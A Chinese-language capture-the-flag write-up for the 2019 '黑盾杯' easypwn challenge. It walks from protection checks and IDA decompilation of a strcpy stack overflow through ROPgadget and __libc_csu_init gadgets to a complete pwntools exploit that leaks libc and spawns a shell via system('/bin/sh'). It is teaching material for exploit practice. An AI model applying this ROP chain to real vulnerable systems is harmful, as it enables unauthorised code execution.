# 黑盾杯-2019-PWN-easypwn

首先检查一下程序保护措施

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以发现程序开启了**NX**保护即栈不可执行保护，我们再开启**IDA Pro**进行反汇编

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf; // [rsp+0h] [rbp-400h]

  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  write(1, "Welcome to CTF\n", 0xFuLL);
  read(0, &buf, 0x400uLL);
  sub_4006C6(&buf);
  return 0LL;
}
```

然后我们查看**sub_4006C6**函数

```c
int __fastcall sub_4006C6(const char *a1)
{
  char dest; // [rsp+10h] [rbp-10h]
  strcpy(&dest, a1);
  return printf("%s", &dest);
}
```

我们可以发现到一个显著的栈溢出漏洞，可以看见read函数读取了长度为**0x400(1024)**的字符，然而**sub_4006C6**函数里面的可以看到栈桢的大小是**10h**

由于**sub_4006C6**函数的栈桢大小**10h**远小于**read**函数可以读取的数据长度**400h**，在进行循环赋值的时候，**sub_4006C6**函数保存在栈中的返回地址会被覆盖

我们进行动态调式验证一下我们的判断

```shell
pwndbg> b *0x00000000004006F6
Breakpoint 1 at 0x4006f6
pwndbg> r
Starting program: /mnt/hgfs/share/easypwn/easypwn 
Welcome to CTF
aaaaaaaaaaaaaaaa

Breakpoint 1, 0x00000000004006f6 in ?? ()
```

我们查看一下栈上的情况

```shell
pwndbg> stack 50
00:0000│ rsp      0x7fffffffda60 —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad208b
01:0008│          0x7fffffffda68 —▸ 0x7fffffffda90 ◂— 0x6161616161616161 ('aaaaaaaa')
02:0010│ rsi      0x7fffffffda70 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓
04:0020│ rdx rbp  0x7fffffffda80 —▸ 0x7fffffffda0a ◂— 0xdff800007ffff7a1
```

我们可以发现函数的返回地址就是如下图所示，且即将被覆盖，超过**0x18**字节即会覆盖返回地址

```shell
04:0020│ rdx rbp  0x7fffffffda80 —▸ 0x7fffffffda0a ◂— 0xdff800007ffff7a1
```

由于程序设置了栈不可执行，可以构造**ROP**链，泄露**libc**中的函数

**64**位程序和我们之前一直做的**32**位程序在传参数方式上有很大的不同

**64**位和**32**位的区别主要有两点：首先是内存地址的范围由**32**位变成了**64**位。但是可以使用的内存地址不能大于`0x00007FFFFFFFFFFF`，否则会抛出异常。其次是函数参数的传递方式发生了改变，**x86**中参数都是保存在栈上,但在x64中的前六个参数依次保存在**RDI**, **RSI**, **RDX**, **RCX**,**R8**和 **R9**中，如果还有更多的参数的话才会保存在栈上。

也就是说我们需要指令将传入栈中的数据弹出栈传入寄存器中才能完成参数传递。所以我们需要寻找一些类似于`pop rdi; ret`的这种**gadget**，

由于**sub_4006C6**拷贝时，会被**\x00**截断，所以不能连续覆盖多个地址来**ROP**，

在**sub_4006C6**函数**ret**处下断点，调试可以发现**sub_4006C6**返回地址下方即为**read**时的**buf**处

所以可以覆盖返回地址为**pop pop pop pop ret**指令地址，返回时弹出**0x18**个填充字节和返回地址,返回到**buf+0x20**处，就避开了栈不可执行

在**buf+0x20**处构造**ROP**，通过write函数，先泄露**libc**基地址，返回到**start**

重新执行，输入使之执行**system('/bin/sh')**

需要用到的信息，包括**bss**段的地址、**main**函数地址、程序中已有函数的地址、**gadgets**地址

所以我们直接只用**ROP gadgets**工具寻找64位环境下可以使用的**gadgets**

```shell
syc@ubuntu:~/Documents/Untitled Folder$ ROPgadget --binary easypwn
Gadgets information
============================================================
0x0000000000400622 : adc byte ptr [rax], ah ; jmp rax
0x000000000040061e : adc dword ptr [rbp - 0x41], ebx ; pop rax ; adc byte ptr [rax], ah ; jmp rax
0x00000000004007ef : add bl, dh ; ret
0x00000000004007ed : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004007eb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x000000000040076d : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x000000000040062c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004007ec : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000040076e : add byte ptr [rax], al ; add cl, cl ; ret
0x000000000040053b : add byte ptr [rax], al ; add rsp, 8 ; ret
0x000000000040076f : add byte ptr [rax], al ; leave ; ret
0x000000000040062e : add byte ptr [rax], al ; pop rbp ; ret
0x00000000004007ee : add byte ptr [rax], al ; ret
0x0000000000400698 : add byte ptr [rcx], al ; ret
0x0000000000400770 : add cl, cl ; ret
0x0000000000400694 : add eax, 0x2009de ; add ebx, esi ; ret
0x0000000000400699 : add ebx, esi ; ret
0x000000000040053e : add esp, 8 ; ret
0x000000000040053d : add rsp, 8 ; ret
0x0000000000400697 : and byte ptr [rax], al ; add ebx, esi ; ret
0x00000000004007c9 : call qword ptr [r12 + rbx*8]
0x00000000004007ca : call qword ptr [rsp + rbx*8]
0x00000000004006be : call rax
0x00000000004006fa : dec ecx ; ret
0x0000000000400695 : fimul word ptr [rcx] ; and byte ptr [rax], al ; add ebx, esi ; ret
0x00000000004007cc : fmul qword ptr [rax - 0x7d] ; ret
0x00000000004006b9 : int1 ; push rbp ; mov rbp, rsp ; call rax
0x000000000040061d : je 0x400638 ; pop rbp ; mov edi, 0x601058 ; jmp rax
0x000000000040066b : je 0x400680 ; pop rbp ; mov edi, 0x601058 ; jmp rax
0x00000000004006b8 : je 0x4006b1 ; push rbp ; mov rbp, rsp ; call rax
0x0000000000400625 : jmp rax
0x00000000004006fb : leave ; ret
0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret
0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret
0x000000000040076c : mov eax, 0 ; leave ; ret
0x00000000004006bc : mov ebp, esp ; call rax
0x0000000000400620 : mov edi, 0x601058 ; jmp rax
0x00000000004007c7 : mov edi, edi ; call qword ptr [r12 + rbx*8]
0x00000000004007c6 : mov edi, r15d ; call qword ptr [r12 + rbx*8]
0x00000000004006bb : mov rbp, rsp ; call rax
0x0000000000400628 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004007e8 : nop dword ptr [rax + rax] ; ret
0x0000000000400675 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400696 : or dword ptr [rax], esp ; add byte ptr [rcx], al ; ret
0x000000000040066c : or ebx, dword ptr [rbp - 0x41] ; pop rax ; adc byte ptr [rax], ah ; jmp rax
0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007e0 : pop r14 ; pop r15 ; ret
0x00000000004007e2 : pop r15 ; ret
0x0000000000400621 : pop rax ; adc byte ptr [rax], ah ; jmp rax
0x0000000000400692 : pop rbp ; mov byte ptr [rip + 0x2009de], 1 ; ret
0x000000000040061f : pop rbp ; mov edi, 0x601058 ; jmp rax
0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400630 : pop rbp ; ret
0x00000000004007e3 : pop rdi ; ret
0x00000000004007e1 : pop rsi ; pop r15 ; ret
0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ba : push rbp ; mov rbp, rsp ; call rax
0x0000000000400541 : ret
0x0000000000400296 : retf
0x000000000040066a : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; pop rax ; adc byte ptr [rax], ah ; jmp rax
0x000000000040061c : sal byte ptr [rcx + rdx + 0x5d], 0xbf ; pop rax ; adc byte ptr [rax], ah ; jmp rax
0x00000000004006b7 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax
0x00000000004007f5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004007f4 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040062a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004007ea : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004006b6 : test eax, eax ; je 0x4006b3 ; push rbp ; mov rbp, rsp ; call rax
0x00000000004006b5 : test rax, rax ; je 0x4006b4 ; push rbp ; mov rbp, rsp ; call rax

Unique gadgets found: 69
```

不过这样子有点太乱了，我们一般只需要使用**pop**、**ret**、**mov**类型的**gadgets**，所以我们再查一查

```shell
syc@ubuntu:/mnt/hgfs/share/easypwn$ ROPgadget --binary easypwn --only "pop|ret"
Gadgets information
============================================================
0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007e0 : pop r14 ; pop r15 ; ret
0x00000000004007e2 : pop r15 ; ret
0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400630 : pop rbp ; ret
0x00000000004007e3 : pop rdi ; ret
0x00000000004007e1 : pop rsi ; pop r15 ; ret
0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400541 : ret

Unique gadgets found: 11
```

```
0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret
0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret
0x000000000040076c : mov eax, 0 ; leave ; ret
0x00000000004006bc : mov ebp, esp ; call rax
0x0000000000400620 : mov edi, 0x601058 ; jmp rax
0x00000000004007c7 : mov edi, edi ; call qword ptr [r12 + rbx*8]
0x00000000004007c6 : mov edi, r15d ; call qword ptr [r12 + rbx*8]
0x00000000004006bb : mov rbp, rsp ; call rax
```

 其实这题有坑，其实是存在我们常用的**gadgets**的，只是工具没有搜索出来，然后也没有标识**__libc_csu_init()**这个函数，就需要我们自己多去看看题目

```c
.text:0000000000400780 ; __unwind {
.text:0000000000400780                 push    r15
.text:0000000000400782                 push    r14
.text:0000000000400784                 mov     r15d, edi
.text:0000000000400787                 push    r13
.text:0000000000400789                 push    r12
.text:000000000040078B                 lea     r12, off_600E10
.text:0000000000400792                 push    rbp
.text:0000000000400793                 lea     rbp, off_600E18
.text:000000000040079A                 push    rbx
.text:000000000040079B                 mov     r14, rsi
.text:000000000040079E                 mov     r13, rdx
.text:00000000004007A1                 sub     rbp, r12
.text:00000000004007A4                 sub     rsp, 8
.text:00000000004007A8                 sar     rbp, 3
.text:00000000004007AC                 call    _init_proc
.text:00000000004007B1                 test    rbp, rbp
.text:00000000004007B4                 jz      short loc_4007D6
.text:00000000004007B6                 xor     ebx, ebx
.text:00000000004007B8                 nop     dword ptr [rax+rax+00000000h]
.text:00000000004007C0
.text:00000000004007C0 loc_4007C0:                             ; CODE XREF: init+54↓j
.text:00000000004007C0                 mov     rdx, r13
.text:00000000004007C3                 mov     rsi, r14
.text:00000000004007C6                 mov     edi, r15d
.text:00000000004007C9                 call    qword ptr [r12+rbx*8]
.text:00000000004007CD                 add     rbx, 1
.text:00000000004007D1                 cmp     rbx, rbp
.text:00000000004007D4                 jnz     short loc_4007C0
.text:00000000004007D6
.text:00000000004007D6 loc_4007D6:                             ; CODE XREF: init+34↑j
.text:00000000004007D6                 add     rsp, 8
.text:00000000004007DA                 pop     rbx
.text:00000000004007DB                 pop     rbp
.text:00000000004007DC                 pop     r12
.text:00000000004007DE                 pop     r13
.text:00000000004007E0                 pop     r14
.text:00000000004007E2                 pop     r15
.text:00000000004007E4                 retn
.text:00000000004007E4 ; } // starts at 400780
```

然后就是套路模板EXP

```python
from pwn import *
io=process('./easypwn')
elf=ELF("./easypwn")
libc=ELF("./libc-2.23.so")
got_write = elf.got['write']
got_read = elf.got['read']
main_addr = 0x4006FD
pop_rdi_ret = 0x4007E3# pop rdi ret
pop4_r12_ret = 0x4007DC# pop r12 r13 r14 r15
pop6_rbx_ret = 0x4007DA# pop rbx rbp r12 r13 r14 r15
mov_rdx_rsi_edi_call = 0x4007C0
#mov rdx, r13 mov rsi, r14 mov di, r15d  call qword ptr [r12+rbx*8]
if __name__ =="__main__":
    io.recvuntil("Welcome to CTF\n")

    got_write = elf.got['write']

    payload=0x18*"a" + p64(pop4_r12_ret)

    payload+=p64(pop6_rbx_ret)+ p64(0x0) + p64(0x1) + p64(got_write)
    payload+=p64(8) + p64(got_write) + p64(1)  + p64(mov_rdx_rsi_edi_call)
    payload+='a'*56
    payload+=p64(main_addr)
    io.sendline(payload)
 
    io.recvuntil(0x18*"a")
    io.recv(3)
    write_addr=u64(io.recv(6).ljust(8,'\x00'))
    print "write_addr:"+hex(write_addr)
    libc_base_addr=write_addr-libc.sym['write']
    print "libc_base_addr:"+hex(libc_base_addr)
    system_addr=libc_base_addr+libc.sym['system']
    print "system_addr:"+hex(system_addr)
    
    bbs_addr = elf.bss()
    
    payload =  0x18*"a"
    payload += p64(pop4_r12_ret)
    payload += p64(pop6_rbx_ret) + p64(0) + p64(1) + p64(got_read) + p64(8) + p64(bbs_addr) + p64(0)
    payload += p64(mov_rdx_rsi_edi_call)
    payload += "A" * 56
    payload += p64(pop_rdi_ret)
    payload += p64(bbs_addr)
    payload += p64(system_addr)

    io.recvuntil('Welcome to CTF\n')
    print "\n#############sending payload2#############\n"
    io.send(payload)
    io.send("/bin/sh\x00")
    io.interactive()
```

